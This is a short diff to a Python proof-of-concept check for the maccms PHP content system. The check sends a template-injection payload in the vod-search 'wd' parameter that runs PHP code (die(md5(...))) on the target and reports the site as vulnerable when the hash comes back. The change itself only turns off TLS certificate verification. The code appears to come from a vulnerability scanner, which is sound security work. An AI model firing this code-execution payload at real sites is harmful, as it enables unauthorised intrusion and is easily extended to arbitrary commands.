@@ -17,7 +17,7 @@ def poc(url):
     try:
         p, c = randomMD5()
         payload = "/index.php?m=vod-search&wd={if-A:die(md5(%s))}{endif-A}" % (p)
-        if c in requests.get(url + payload, allow_redirects=False).text:
+        if c in requests.get(url + payload, allow_redirects=False, verify=False).text:
             return '[maccms]' + url
     except Exception:
         pass
